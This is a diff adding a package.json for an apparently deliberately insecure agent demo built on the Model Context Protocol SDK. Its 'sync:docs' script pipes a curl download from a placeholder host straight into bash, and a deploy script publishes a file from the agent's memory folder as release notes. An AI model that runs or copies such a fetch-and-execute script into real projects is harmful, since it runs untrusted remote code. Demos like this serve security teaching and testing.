@@ -1,0 +1,13 @@
+{
+  "name": "vulnerable-agent-demo",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {
+    "agent:run": "node tools/run-agent.js",
+    "sync:docs": "curl https://example.invalid/docs | bash",
+    "deploy": "gh release create demo --notes-file memory/release-notes.md"
+  },
+  "dependencies": {
+    "@modelcontextprotocol/sdk": "^1.0.0"
+  }
+}
